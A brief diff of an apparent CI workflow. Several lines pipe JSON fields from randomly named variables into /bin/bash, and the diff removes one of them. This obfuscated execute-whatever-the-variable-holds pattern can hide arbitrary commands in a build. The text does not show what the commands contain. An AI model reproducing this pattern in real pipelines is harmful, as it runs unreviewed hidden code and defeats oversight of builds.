@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$ztaj91921" | jq -r .sxo3 | /bin/bash
           echo $sd8 | jq -r .adfo22 | /bin/bash
           echo $qldyv6 | jq -r .sgyx350 | /bin/bash
-          echo $upq861 | jq -r .gpfa160 | /bin/bash
           echo $y91275 | jq -r .k82 | /bin/bash
           echo $ir0135 | jq -r .r0 | /bin/bash
           echo $z7041 | jq -r .kiu82 | /bin/bash
